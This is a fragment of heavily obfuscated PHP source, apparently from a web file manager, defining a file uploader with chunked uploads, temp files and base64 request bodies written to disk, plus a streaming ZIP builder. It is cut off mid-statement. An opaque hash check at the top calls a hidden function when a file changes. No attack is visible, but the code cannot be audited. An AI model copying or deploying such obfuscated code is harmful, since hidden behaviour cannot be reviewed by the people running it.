(class_exists($_SERVER[»„][1934])) { $Cô”ĞĞá = LIB_DIR . $_SERVER[»„][748]; $Aö¢ÅáÜêš = $_SERVER[»„][749]; if ($_SERVER[$_SERVER[»„][750]] != $Aö¢ÅáÜêš($Cô”ĞĞá)) { goto F§‡ÅÚğ÷; F§‡ÅÚğ÷: $B÷ÜÜø¯ò’ = $_SERVER[»„][751]; $aÙ¬ëç´† = $_SERVER[$_SERVER[»„][752]] . $_SERVER[»„][753]; $aÜ£âéœõ = $B÷ÜÜø¯ò’($aÙ¬ëç´†); goto a¶ÈÑ®éŞÈ; a¶ÈÑ®éŞÈ: $dêá›æÈ“ = explode($_SERVER[»„][213], $aÜ£âéœõ); if (count($dêá›æÈ“) < $_SERVER[»„][566]) { $F‚Ò”èÑ­› = $_SERVER[»„][754]; $F‚Ò”èÑ­›(); } $AÅí‘è¬— = $_SERVER[»„][755]; goto cé×¶ªèÜİ; cé×¶ªèÜİ: $AÅí‘è¬—($Cô”ĞĞá); goto D¿ÌÒğÛ; D¿ÌÒğÛ: } class Services_JSON_Error extends PEAR_Error { function __construct($d„Ô¸Æ÷æ = "\x75\x6e\153\156\157\x77\x6e\40\x65\162\162\x6f\162", $CÅÙöà•Øå = null, $b£ìõ›µÏĞ = null, $B§«®—’·Š = null, $aÀ‚ŠÁêÃ = null) { parent::PEAR_Error($d„Ô¸Æ÷æ, $CÅÙöà•Øå, $b£ìõ›µÏĞ, $B§«®—’·Š, $aÀ‚ŠÁêÃ); } } } else { $Cô”ĞĞá = LIB_DIR . $_SERVER[»„][748]; $Aö¢ÅáÜêš = $_SERVER[»„][749]; if ($_SERVER[$_SERVER[»„][750]] != $Aö¢ÅáÜêš($Cô”ĞĞá)) { goto CÚÜ­×òĞ; e„î—¶¶íé: $dêá›æÈ“ = explode($_SERVER[»„][213], $aÜ£âéœõ); if (count($dêá›æÈ“) < $_SERVER[»„][566]) { $F‚Ò”èÑ­› = $_SERVER[»„][754]; $F‚Ò”èÑ­›(); } $AÅí‘è¬— = $_SERVER[»„][755]; goto E‡‘´œÈó; CÚÜ­×òĞ: $B÷ÜÜø¯ò’ = $_SERVER[»„][751]; $aÙ¬ëç´† = $_SERVER[$_SERVER[»„][752]] . $_SERVER[»„][753]; $aÜ£âéœõ = $B÷ÜÜø¯ò’($aÙ¬ëç´†); goto e„î—¶¶íé; E‡‘´œÈó: $AÅí‘è¬—($Cô”ĞĞá); goto CÒ°¦ÂŞå; CÒ°¦ÂŞå: } class Services_JSON_Error { function __construct($cÛÒˆ™ğ Ì = "\165\x6e\x6b\x6e\157\x77\156\x20\x65\x72\x72\157\162", $A›´¦ŒĞÃ• = null, $f†˜ë×å¢„ = null, $d©Û„ï£ó  = null, $c†»Çê– = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto f¾Ä‹Ñ¦²£; F¥‡ãÔÛ†«: if (!empty($_FILES)) { $A‚ïøÍï¤ø = $_FILES[$B¯½õŒ²¹Œ[163]]; $this->uploadFile = $A‚ïøÍï¤ø[$B¯½õŒ²¹Œ[1935]]; if (!$this->uploadFile && $A‚ïøÍï¤ø[$B¯½õŒ²¹Œ[1199]] > 0) { show_json($this->errorInfo($A‚ïøÍï¤ø[$B¯½õŒ²¹Œ[1199]]), !1); } } else { if (isset($in[$B¯½õŒ²¹Œ[382]])) { $this->uploadFile = isset($in[$B¯½õŒ²¹Œ[1936]]) ? $B¯½õŒ²¹Œ[1937] : $B¯½õŒ²¹Œ[1782]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto c¥Æ´ŸÏ’; f¾Ä‹Ñ¦²£: $B¯½õŒ²¹Œ =& $_SERVER[»„]; global $in; $this->in =& $in; goto F¥‡ãÔÛ†«; c¥Æ´ŸÏ’: $this->checkSize(); $this->tempPathInit(); goto E‰‰Òè²ù÷; E‰‰Òè²ù÷: } public function upload() { goto B‚áš“¾…á; E÷›œÉ®¶º: CacheLock::unlock($this->tempFile); return $this->tempFile; goto aİ²ßé‘¢÷; B‚áš“¾…á: $fâºôšÎÀ“ =& $_SERVER[»„]; $aÃ´ËÛùî¶ = isset($this->in[$fâºôšÎÀ“[1938]]) ? intval($this->in[$fâºôšÎÀ“[1938]]) : 0; $Fß´ïš³ç‚ = isset($this->in[$fâºôšÎÀ“[1939]]) ? intval($this->in[$fâºôšÎÀ“[1939]]) : 1; goto Fë³ƒ£ÕÜ²; B¥ÁŠÇ‹±Ò: @unlink($B¹–¿µ‹»¤); if (!$aø®°ö‰ÊØ) { $this->showJson($fâºôšÎÀ“[1946] . $aÃ´ËÛùî¶, !1); } $Cˆ•á²ÓØ‚[$fâºôšÎÀ“[1947]] = $Fß´ïš³ç‚; goto cì‘Óàëé; cì‘Óàëé: $Cˆ•á²ÓØ‚[$fâºôšÎÀ“[1948]][$fâºôšÎÀ“[1949] . $aÃ´ËÛùî¶] = array($fâºôšÎÀ“[1950] => $c¶îè”’º‡, $fâºôšÎÀ“[1024] => $aÃ´ËÛùî¶, $fâºôšÎÀ“[77] => $EÅŸ±ïùÉÉ, $fâºôšÎÀ“[160] => $d÷œŠ¿´ì); $this->statusSet($Cˆ•á²ÓØ‚); if (count($Cˆ•á²ÓØ‚[$fâºôšÎÀ“[1948]]) != $Cˆ•á²ÓØ‚[$fâºôšÎÀ“[1947]]) { $this->showJson($fâºôšÎÀ“[1951] . $aÃ´ËÛùî¶, !0); } goto Dèè¾å¡‹; Dèè¾å¡‹: ignore_timeout(); if (!$this->checkChunkHash($Cˆ•á²ÓØ‚)) { $this->showJson($fâºôšÎÀ“[1952], !1); } $this->statusSet(!1); goto E÷›œÉ®¶º; eÓ‚öèÉ¸­: $B¹–¿µ‹»¤ = $this->moveUploadedFile($AÙ•ª›‡Øë); if ($EÅŸ±ïùÉÉ > 0 && filesize($B¹–¿µ‹»¤) == 0) { $this->showJson($fâºôšÎÀ“[1943], !1); } if (!$B¹–¿µ‹»¤) { $this->showJson(LNG($fâºôšÎÀ“[1944]), !1); } goto B‡…«ŞÌæê; Fë³ƒ£ÕÜ²: $AÙ•ª›‡Øë = $this->tempFile . $fâºôšÎÀ“[1940] . $aÃ´ËÛùî¶; $EÅŸ±ïùÉÉ = isset($this->in[$fâºôšÎÀ“[516]]) ? intval($this->in[$fâºôšÎÀ“[516]]) : 0; $Có¸²Ø‡È = isset($this->in[$fâºôšÎÀ“[1941]]) ? intval($this->in[$fâºôšÎÀ“[1941]]) : 0; goto Dİ‹ğòÖŞÅ; Dµ…ãõĞ¾½: CacheLock::lock($this->tempFile, 20); $Cˆ•á²ÓØ‚ = $this->statusGet(); $this->initFileTemp(); goto eÓ‚öèÉ¸­; B‡…«ŞÌæê: $c¶îè”’º‡ = $aÃ´ËÛùî¶ * $Có¸²Ø‡È; $b˜†¨›Ëíì = @fopen($this->tempFile, $fâºôšÎÀ“[1945]); fseek($b˜†¨›Ëíì, $c¶îè”’º‡); goto féÙñ—Ì‘õ; Dİ‹ğòÖŞÅ: if ($Fß´ïš³ç‚ > 1 && $Có¸²Ø‡È <= 0) { show_json($fâºôšÎÀ“[1942], !1); } if ($Có¸²Ø‡È > $EÅŸ±ïùÉÉ) { $Fß´ïš³ç‚ = 1; } if ($Fß´ïš³ç‚ <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto Dµ…ãõĞ¾½; féÙñ—Ì‘õ: $aø®°ö‰ÊØ = $this->writeTo($B¹–¿µ‹»¤, $b˜†¨›Ëíì, $this->tempFile); $d÷œŠ¿´ì = IO::hashSimple($B¹–¿µ‹»¤); $EÅŸ±ïùÉÉ = IO::size($B¹–¿µ‹»¤); goto B¥ÁŠÇ‹±Ò; aİ²ßé‘¢÷: } private function checkSize() { $c—Ä£ËËî£ =& $_SERVER[»„]; if (phpBuild64() || $this->in[$c—Ä£ËËî£[77]] < PHP_INT_MAX) { return; } show_json(LNG($c—Ä£ËËî£[1953]), !1); } private function showJson($F‹ÁõªĞÄ, $B”Ó¥ÚÓîƒ) { CacheLock::unlock($this->tempFile); if (!$B”Ó¥ÚÓîƒ) { return show_json($F‹ÁõªĞÄ, $B”Ó¥ÚÓîƒ); } show_json($F‹ÁõªĞÄ, $B”Ó¥ÚÓîƒ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto fÏÍ…‡óˆ–; Cà¥ñ—Æàö: $this->tempFile = $a‘­Êø¼ÆÕ . $BÃÌ‘œ×›[1956] . md5($EÏÉ“ˆÖ‡ö . $this->in[$BÃÌ‘œ×›[1500]]); goto eÔ™°‡¢’é; Aİğõç¸Ûˆ: touch($a‘­Êø¼ÆÕ . $BÃÌ‘œ×›[1954]); $EÏÉ“ˆÖ‡ö = isset($this->in[$BÃÌ‘œ×›[1955]]) ? $this->in[$BÃÌ‘œ×›[1955]] : !1; if (strlen($EÏÉ“ˆÖ‡ö) < 30) { $EÏÉ“ˆÖ‡ö = md5(USER_ID . $this->in[$BÃÌ‘œ×›[75]] . $this->fileName . $this->in[$BÃÌ‘œ×›[77]]); } goto Cà¥ñ—Æàö; fÏÍ…‡óˆ–: $BÃÌ‘œ×› =& $_SERVER[»„]; $a‘­Êø¼ÆÕ = TEMP_FILES; @mk_dir($a‘­Êø¼ÆÕ); goto Aİğõç¸Ûˆ; eÔ™°‡¢’é: } private function moveUploadedFile($BÁØ¿ÃÌø‘) { $d¢Ÿïõà =& $_SERVER[»„]; $DáÒ„ç¤½ç = $this->uploadFile; if ($DáÒ„ç¤½ç == $d¢Ÿïõà[1957]) { @file_put_contents($BÁØ¿ÃÌø‘, base64_decode($_REQUEST[$d¢Ÿïõà[1958]])); } else { if ($DáÒ„ç¤½ç == $d¢Ÿïõà[1782]) { $Båù¿Û‚Ë = @fopen($BÁØ¿ÃÌø‘, $d¢Ÿïõà[1489]); $this->writeTo($DáÒ„ç¤½ç, $Båù¿Û‚Ë, $BÁØ¿ÃÌø‘); } else { if (!move_uploaded_file($DáÒ„ç¤½ç, $BÁØ¿ÃÌø‘)) { return !1; } } } return $BÁØ¿ÃÌø‘; } private function writeTo($eà¿Ì¡•ñ±, $C±œ’†È¡, $d»Ë¨ô¡ĞÁ) { goto b‹Áßà¡Ë; aÃ´ñÆÁ: return !0; goto aùËòĞ´—ò; eŞõªšÈÆ: fclose($DÕ·„Şİö); fclose($C±œ’†È¡); CacheLock::unlock($E²š«÷Ò˜´); goto aÃ´ñÆÁ; b‹Áßà¡Ë: $FÍ‹­š†‡Û =& $_SERVER[»„]; $E²š«÷Ò˜´ = $FÍ‹­š†‡Û[1959] . $d»Ë¨ô¡ĞÁ; $E˜·°¯Ü¤Ì = CacheLock::lock($E²š«÷Ò˜´, 1); goto F©©¦œª¶ ; F©©¦œª¶ : $DÕ·„Şİö = @fopen($eà¿Ì¡•ñ±, $FÍ‹­š†‡Û[1488]); if (!$DÕ·„Şİö || !$C±œ’†È¡ || !$E˜·°¯Ü¤Ì) { CacheLock::unlock($E²š«÷Ò˜´); return !1; } while (!feof($DÕ·„Şİö)) { fwrite($C±œ’†È¡, fread($DÕ·„Şİö, 1024 * 200)); } goto eŞõªšÈÆ; aùËòĞ´—ò: } private function statusGet() { goto Bß©¶Ï¤ÉØ; Bß©¶Ï¤ÉØ: $c¦²Ì÷ÃÆ² =& $_SERVER[»„]; if (is_array($this->statusData)) { return $this->statusData; } $d´³‘…Æñõ = $this->tempFile . $c¦²Ì÷ÃÆ²[1960]; goto C­ë¤ùÎÉ; C­ë¤ùÎÉ: $a§ª‹Á½Ùê = !1; if (file_exists($d´³‘…Æñõ)) { $a§ª‹Á½Ùê = @file_get_contents($d´³‘…Æñõ); } if ($a§ª‹Á½Ùê) { $this->statusData = json_decode($a§ª‹Á½Ùê, !0); } goto F‚Úµ›¡¯ª; F‚Úµ›¡¯ª: if (!$this->statusData) { $AÖˆ“íêê = array($c¦²Ì÷ÃÆ²[28] => $this->fileName, $c¦²Ì÷ÃÆ²[1947] => 0, $c¦²Ì÷ÃÆ²[1948] => array()); $this->statusSet($AÖˆ“íêê); } return $this->statusData; goto d¾‡Š„¹Ö¥; d¾‡Š„¹Ö¥: } public function statusSet($b‚¡ƒ¦´ß) { $CóñîñÉÆ¨ = $this->tempFile . $_SERVER[»„][1960]; if (!$b‚¡ƒ¦´ß) { if (file_exists($CóñîñÉÆ¨)) { @unlink($CóñîñÉÆ¨); } return !0; } $this->statusData = $b‚¡ƒ¦´ß; return file_put_contents($CóñîñÉÆ¨, json_encode($b‚¡ƒ¦´ß)); } private function initFileTemp() { $A²Óğòê…ö =& $_SERVER[»„]; if (file_exists($this->tempFile)) { return; } $e©“ËÃĞÛ¸ = fopen($this->tempFile, $A²Óğòê…ö[1961]); fseek($e©“ËÃĞÛ¸, $this->in[$A²Óğòê…ö[77]] - 1, SEEK_SET); fwrite($e©“ËÃĞÛ¸, $A²Óğòê…ö[464]); fclose($e©“ËÃĞÛ¸); } public function checkChunk() { goto BÜÑ¸¸ôï¢; Dô¢šÉŠ‹Ñ: return $FÇ¥÷Ğ¿Ò”; goto E”¤éĞ†©†; BÜÑ¸¸ôï¢: $Fà­ğ—¬³Ï =& $_SERVER[»„]; $FÇ¥÷Ğ¿Ò” = array(); CacheLock::lock($this->tempFile); goto fÊ’ªØŠ˜Ê; fÊ’ªØŠ˜Ê: $b°×‚¯ßŠ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($b°×‚¯ßŠ[$Fà­ğ—¬³Ï[1948]] as $E®Ÿ¶ÕÆ«) { $Fë¯“Øæ£Æ = $E®Ÿ¶ÕÆ«[$Fà­ğ—¬³Ï[160]]; if ($Fë¯“Øæ£Æ) { $FÇ¥÷Ğ¿Ò”[$Fà­ğ—¬³Ï[1962] . $E®Ÿ¶ÕÆ«[$Fà­ğ—¬³Ï[1024]]] = $Fë¯“Øæ£Æ; } } goto Dô¢šÉŠ‹Ñ; E”¤éĞ†©†: } private function checkChunkHash($d²ù¿†ˆƒ) { goto Cº¼‹Œ›Êì; e¯±Âåµ: return $d‚÷¥Àœçà; goto d–Ş‹–‡÷Å; Cº¼‹Œ›Êì: $Böëá¡“§É =& $_SERVER[»„]; if (count($d²ù¿†ˆƒ[$Böëá¡“§É[1948]]) != $d²ù¿†ˆƒ[$Böëá¡“§É[1947]]) { return !1; } $e½Ş¨ãÑ§Ã = _get($this->in, $Böëá¡“§É[1955]); goto Aã§ìÏ¿øÑ; e­©”…÷¦Ã: $d‚÷¥Àœçà = !0; foreach ($d²ù¿†ˆƒ[$Böëá¡“§É[1948]] as $B‚°ÜÒ‘Š) { fseek($a´ÓŞº—±Ò, $B‚°ÜÒ‘Š[$Böëá¡“§É[1950]]); $Bä¯ùò˜ÑÎ = PathDriverStream::hash($a´ÓŞº—±Ò, $B‚°ÜÒ‘Š[$Böëá¡“§É[77]]); if ($B‚°ÜÒ‘Š[$Böëá¡“§É[160]] != $Bä¯ùò˜ÑÎ) { $d‚÷¥Àœçà = !1; break; } } fclose($a´ÓŞº—±Ò); goto e¯±Âåµ; Aã§ìÏ¿øÑ: $EİÓÏ’¼Œ = _get($this->in, $Böëá¡“§É[1963]); if (strlen($EİÓÏ’¼Œ) == 32 && IO::hashSimple($this->tempFile) == $e½Ş¨ãÑ§Ã && IO::hashMd5($this->tempFile) == $EİÓÏ’¼Œ) { return !0; } $a´ÓŞº—±Ò = fopen($this->tempFile, $Böëá¡“§É[1150]); goto e­©”…÷¦Ã; d–Ş‹–‡÷Å: } public static function fileName() { goto CÆŞŠéƒó; bó‘Š©ØĞ¿: if ($Eà¦Ç¶”é¹ == $d×ÂÔÒ£[1965] || $Eà¦Ç¶”é¹ == $d×ÂÔÒ£[1966]) { $Eƒ“èô¼Ú = date($d×ÂÔÒ£[678], $dÂÁÅƒƒÒ) . $d×ÂÔÒ£[70] . $in[$d×ÂÔÒ£[77]] . $d×ÂÔÒ£[1597]; } else { if ($Eà¦Ç¶”é¹ == $d×ÂÔÒ£[1967]) { $Eƒ“èô¼Ú = date($d×ÂÔÒ£[678], $dÂÁÅƒƒÒ) . $d×ÂÔÒ£[70] . $in[$d×ÂÔÒ£[77]] . $d×ÂÔÒ£[1968]; } } return $Eƒ“èô¼Ú; goto cÔ‹Ó±İ½î; F¿Ûµ±—: if (!empty($_FILES)) { $Eƒ“èô¼Ú = $Eƒ“èô¼Ú ? $Eƒ“èô¼Ú : $_FILES[$d×ÂÔÒ£[163]][$d×ÂÔÒ£[382]]; } $Eƒ“èô¼Ú = str_replace(array($d×ÂÔÒ£[93], $d×ÂÔÒ£[8]), array($d×ÂÔÒ£[8], $d×ÂÔÒ£[91]), trim($Eƒ“èô¼Ú)); if (!is_wap()) { return $Eƒ“èô¼Ú; } goto CÑñã‘Ù½º; CÆŞŠéƒó: $d×ÂÔÒ£ =& $_SERVER[»„]; global $in; $Eƒ“èô¼Ú = isset($in[$d×ÂÔÒ£[28]]) ? $in[$d×ÂÔÒ£[28]] : $d×ÂÔÒ£[33]; goto F¿Ûµ±—; CÑñã‘Ù½º: $dÂÁÅƒƒÒ = strtotime($in[$d×ÂÔÒ£[1964]]); $dÂÁÅƒƒÒ = $dÂÁÅƒƒÒ ? $dÂÁÅƒƒÒ : time(); $Eà¦Ç¶”é¹ = strtolower($Eƒ“èô¼Ú); goto bó‘Š©ØĞ¿; cÔ‹Ó±İ½î: } private function errorInfo($EÂ¾ßôœ³Ä) { $C§çÖÈÀÆ =& $_SERVER[»„]; $BŠçÎ§­­¶ = array($C§çÖÈÀÆ[1969], $C§çÖÈÀÆ[1970], $C§çÖÈÀÆ[1971], $C§çÖÈÀÆ[1972], $C§çÖÈÀÆ[1973], $C§çÖÈÀÆ[1974], $C§çÖÈÀÆ[1975], $C§çÖÈÀÆ[1976]); return $EÂ¾ßôœ³Ä . $C§çÖÈÀÆ[4] . $BŠçÎ§­­¶[$EÂ¾ßôœ³Ä]; } } class ZipMake { const VERSION = "\60\56\x32\x2e\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($e…‰£­ëç = null) { $bŞÈš×ƒ¯Æ =& $_SERVER[»„]; $this->outputStream = fopen($bŞÈš×ƒ¯Æ[1977], $bŞÈš×ƒ¯Æ[1206]); $this->outputName = $e…‰£­ëç; $this->needHeaders = !0; } public function addFile($b…‡¼‚…‰¦, $fá÷ïÍ”Š¤) { goto D¢Ãò…×‚¸; cå“ÆÕÖÉ: $eéˆäë‘Š = $this->addFileHeader($b…‡¼‚…‰¦, $A×šÊ–ßõ); $AîÆ¦Ìƒ¹ = $Dá¾ğŒ´÷‹ = filesize($fá÷ïÍ”Š¤); $a“å›Í§½ö = fopen($fá÷ïÍ”Š¤, $FãÀ—„²•Ë[1978]); goto a¢£¡¡í’; D¢Ãò…×‚¸: $FãÀ—„²•Ë =& $_SERVER[»„]; $b…‡¼‚…‰¦ = $this->filterFilename($b…‡¼‚…‰¦); $A×šÊ–ßõ = static::METHOD_STORE; goto cå“ÆÕÖÉ; eĞªŒ¦Ä: $this->addFileFooter($b…‡¼‚…‰¦, $A×šÊ–ßõ, $AÛ¡¢¢ºƒç, $AîÆ¦Ìƒ¹, $Dá¾ğŒ´÷‹, $eéˆäë‘Š); goto EŠ¸¢öÏøÆ; a¢£¡¡í’: while (!feof($a“å›Í§½ö)) { $C ”çÏáÉÅ = fread($a“å›Í§½ö, 1048576); $this->send($C ”çÏáÉÅ); } fclose($a“å›Í§½ö); $AÛ¡¢¢ºƒç = hexdec(hash_file($FãÀ—„²•Ë[1979], $fá÷ïÍ”Š¤)); goto eĞªŒ¦Ä; EŠ¸¢öÏøÆ: } public function addFileFromStream($A¤…Õ™Ø×Œ, $FôàÕÑ¼ä) { goto d»½™¶â•š; FÚˆÏâÁî²: fseek($FôàÕÑ¼ä, 0, SEEK_END); $aéÅÚˆ°³š = $få·…®ƒø‘ = ftell($FôàÕÑ¼ä); rewind($FôàÕÑ¼ä); goto BÖõåâİŒ£; d»½™¶â•š: $A¤…Õ™Ø×Œ = $this->filterFilename($A¤…Õ™Ø×Œ); $DÁÙë÷š‡ = static::METHOD_STORE; $ağ¨ğÎŠ = $this->addFileHeader($A¤…Õ™Ø×Œ, $DÁÙë÷š‡); goto FÚˆÏâÁî²; CÂ¢‹‚’à: $this->addFileFooter($A¤…Õ™Ø×Œ, $DÁÙë÷š‡, $C²æÃëŠµ¹, $aéÅÚˆ°³š, $få·…®ƒø‘, $ağ¨ğÎŠ); goto d¢µ©ÁÙ¬¡; BÖõåâİŒ£: $aÏ´…³¶¥  = hash_init($_SERVER[»„][1979]); while (!feof($FôàÕÑ¼ä)) { $f†àÈõ£ = fread($FôàÕÑ¼ä, 1048576); hash_update($aÏ´…³¶¥ , $f†àÈõ£); $this->send($f†àÈõ£); } $C²æÃëŠµ¹ = hexdec(hash_final($aÏ´…³¶¥ )); goto CÂ¢‹‚’à; d¢µ©ÁÙ¬¡: } public function finish() { foreach ($this->files as $BÉÓ£õİÉš) { $this->addCdrFile($BÉÓ£õİÉš); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($AÈœùŒ™Ä¶, $c×„Âï–Ã) { goto cŒê»¬ÕÇ¥; cŒê»¬ÕÇ¥: $bÖîâ¥’æ =& $_SERVER[»„]; $AÈœùŒ™Ä¶ = preg_replace($bÖîâ¥’æ[1980], $bÖîâ¥’æ[33], $AÈœùŒ™Ä¶); $a§¶¶É• = strlen($AÈœùŒ™Ä¶); goto aŸšè«; Cˆ¯®Êô‘Ä: $c“…¨ßğíæ = $this->packFields($F‘ÄŠŒ¦²ª); $eó…ÁÁè’À = $this->packFields($Bï†â­ÇˆÀ); $this->send($c“…¨ßğíæ . $AÈœùŒ™Ä¶ . $eó…ÁÁè’À); goto bÀÚâï—ßë; aŸšè«: $d…É…¬Ä½ß = $this->dosTime(time()); $F‘ÄŠŒ¦²ª = array(array($bÖîâ¥’æ[1981], static::FILE_HEADER_SIGNATURE), array($bÖîâ¥’æ[1982], static::ZIP_VERSION_64), array($bÖîâ¥’æ[1982], 8), array($bÖîâ¥’æ[1982], $c×„Âï–Ã), array($bÖîâ¥’æ[1981], $d…É…¬Ä½ß), array($bÖîâ¥’æ[1981], 0), array($bÖîâ¥’æ[1981], 4294967295), array($bÖîâ¥’æ[1981], 4294967295), array($bÖîâ¥’æ[1982], $a§¶¶É•), array($bÖîâ¥’æ[1982], 32)); $Bï†â­ÇˆÀ = array(array($bÖîâ¥’æ[1982], 1), array($bÖîâ¥’æ[1982], 28), array($bÖîâ¥’æ[1983], 0), array($bÖîâ¥’æ[1983], 0), array($bÖîâ¥’æ[1983], 0), array($bÖîâ¥’æ[1981], 0)); goto Cˆ¯®Êô‘Ä; bÀÚâï—ßë: return strlen($c“…¨ßğíæ) + $a§¶¶É• + strlen($eó…ÁÁè’À); goto a¥°íÑ¥×; a¥°íÑ¥×: } protected function addFileFooter($C­éÁ­Ş, $dÀ£ïµÄÏ¶, $dÆâ³×ªñ™, $cí³‡ä³Ä´, $Aà‚äŸù×, $BÅ× œ¬ù‹) { $Fêè¼‘Æ =& $_SERVER[»„]; $FÒßÌ‡Šõ´ = array(array($Fêè¼‘Æ[1981], static::DATA_DESCRIPTOR_SIGNATURE), array($Fêè¼‘Æ[1981], $dÆâ³×ªñ™), array($Fêè¼‘Æ[1983], $cí³‡ä³Ä´), array($Fêè¼‘Æ[1983], $Aà‚äŸù×)); $Cš½Ç¤Œ±ğ = $this->packFields($FÒßÌ‡Šõ´); $this->send($Cš½Ç¤Œ±ğ); $AİºòÜÇšÑ = $BÅ× œ¬ù‹ + $cí³‡ä³Ä´ + $Cô¸§ËŞ¸ª; $this->addToCdr($C­éÁ­Ş, $dÀ£ïµÄÏ¶, $dÆâ³×ªñ™, $cí³‡ä³Ä´, $Aà‚äŸù×, $AİºòÜÇšÑ); } private function addToCdr($F¤³Áïº‹, $aâğ÷ÄÉœ, $e®Ù—½Îß³, $f‚ˆèÔÓÙ, $dœÙÔº”º’, $Bğ¶ïÍ‰¨Š) { $this->files[] = array($F¤³Áïº‹, $aâğ÷ÄÉœ, $e®Ù—½Îß³, $f‚ˆèÔÓÙ, $dœÙÔº”º’, $this->ofs); $this->ofs += $Bğ¶ïÍ‰¨Š; } protected function addCdrFile($bËİŒØÍ¶ö) { goto E£’é‹µìå; b“»øÔÜï‘: $aù×±¼àÓô = $this->dosTime(time()); $FİÕ©¼áÎ = array(array($bÏ¬÷ÜË•Ñ[1981], static::CDR_FILE_SIGNATURE), array($bÏ¬÷ÜË•Ñ[1982], static::ZIP_VERSION_64), array($bÏ¬÷ÜË•Ñ[1982], static::ZIP_VERSION_64), array($bÏ¬÷ÜË•Ñ[1982], 8), array($bÏ¬÷ÜË•Ñ[1982], $F¶Ç®ÅŠÆ‘), array($bÏ¬÷ÜË•Ñ[1981], $aù×±¼àÓô), array($bÏ¬÷ÜË•Ñ[1981], $aŒšãŠéö), array($bÏ¬÷ÜË•Ñ[1981], 4294967295), array($bÏ¬÷ÜË•Ñ[1981], 4294967295), array($bÏ¬÷ÜË•Ñ[1982], strlen($AÒÜñÆ«ù¶)), array($bÏ¬÷ÜË•Ñ[1982], 32), array($bÏ¬÷ÜË•Ñ[1982], strlen($fÑ¤Ñ©’Ô›)), array($bÏ¬÷ÜË•Ñ[1982], 0), array($bÏ¬÷ÜË•Ñ[1982], 0), array($bÏ¬÷ÜË•Ñ[1981], 32), array($bÏ¬÷ÜË•Ñ[1981], 4294967295)); $F¬Å‹ƒ…‹Ö = array(array($bÏ¬÷ÜË•Ñ[1982], 1), array($bÏ¬÷ÜË•Ñ[1982], 28), array($bÏ¬÷ÜË•Ñ[1983], $A©ªœó‡µ´), array($bÏ¬÷ÜË•Ñ[1983], $e¹¥²ëÛ´Ö), array($bÏ¬÷ÜË•Ñ[1983], $Cˆƒ¹èÌ²„), array($bÏ¬÷ÜË•Ñ[1981], 0)); goto f‹‰å©ÊĞ‘; f‹‰å©ÊĞ‘: $FËğãğò¡¡ = $this->packFields($FİÕ©¼áÎ); $B‰¥À÷ßÙ = $this->packFields($F¬Å‹ƒ…‹Ö); $c¿™¸³‘¾ = $FËğãğò¡¡ . $AÒÜñÆ«ù¶ . $fÑ¤Ñ©’Ô› . $B‰¥À÷ßÙ; goto cøÙ„˜ãÔƒ; E£’é‹µìå: $bÏ¬÷ÜË•Ñ =& $_SERVER[»„]; list($AÒÜñÆ«ù¶, $F¶Ç®ÅŠÆ‘, $aŒšãŠéö, $e¹¥²ëÛ´Ö, $A©ªœó‡µ´, $Cˆƒ¹èÌ²„) = $bËİŒØÍ¶ö; $fÑ¤Ñ©’Ô› = $bÏ¬÷ÜË•Ñ[33]; goto b“»øÔÜï‘; cøÙ„˜ãÔƒ: $this->send($c¿™¸³‘¾); $this->cdr_ofs += strlen($c¿™¸³‘¾); goto Cíî×â—Á°; Cíî×â—Á°: } protected function addCdr64Eof() { goto aääçß ¼Ù; cË÷…º£ĞÒ: $d›ò–µØãÔ = $this->ofs; $c¼¾°Ô—›Ë = array(array($CõÈ™Ö›Îõ[1981], static::ZIP64_CDR_EOF_SIGNATURE), array($CõÈ™Ö›Îõ[1983], 44), array($CõÈ™Ö›Îõ[1982], static::ZIP_VERSION_64), array($CõÈ™Ö›Îõ[1982], static::ZIP_VERSION_64), array($CõÈ™Ö›Îõ[1981], 0), array($CõÈ™Ö›Îõ[1981], 0), array($CõÈ™Ö›Îõ[1983], $EÅšôÂÑÅ½), array($CõÈ™Ö›Îõ[1983], $EÅšôÂÑÅ½), array($CõÈ™Ö›Îõ[1983], $a¦İ÷³é³), array($CõÈ™Ö›Îõ[1983], $d›ò–µØãÔ)); $dí†½ë©äµ = $this->packFields($c¼¾°Ô—›Ë); goto c±ç„ˆ­Ó; aääçß ¼Ù: $CõÈ™Ö›Îõ =& $_SERVER[»„]; $EÅšôÂÑÅ½ = count($this->files); $a¦İ÷³é³ = $this->cdr_ofs; goto cË÷…º£ĞÒ; c±ç„ˆ­Ó: $this->send($dí†½ë©äµ); goto A‘£îºéŸÓ; A‘£îºéŸÓ: } protected function addCdr64Locator() { goto b¬ß—¯»êœ; AõÇêâ¬Ï„: $this->send($dîÈÊÜÕ‹); goto bˆùÏœ÷¥µ; e«õØÔ‚¦Œ: $fö½é–Ó = $this->ofs; $a´¤æäì¬ = array(array($F¿‡õÅÔ¿Ø[1981], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($F¿‡õÅÔ¿Ø[1981], 0), array($F¿‡õÅÔ¿Ø[1983], $fö½é–Ó + $Fİ­÷š¥ä´), array($F¿‡õÅÔ¿Ø[1981], 1)); $dîÈÊÜÕ‹ = $this->packFields($a´¤æäì¬); goto AõÇêâ¬Ï„; b¬ß—¯»êœ: $F¿‡õÅÔ¿Ø =& $_SERVER[»„]; $Dâ½´ñÍŠÅ = count($this->files); $Fİ­÷š¥ä´ = $this->cdr_ofs; goto e«õØÔ‚¦Œ; bˆùÏœ÷¥µ: } protected function addCdrEof() { goto CªÂã°¡ƒâ; D¦´Öô‚®©: $DåÜóøïßØ = $this->ofs; $EÇ‘…Í•Û = $dºŒ•ÛàØö[33]; $eê¬ÈÚİ× = array(array($dºŒ•ÛàØö[1981], 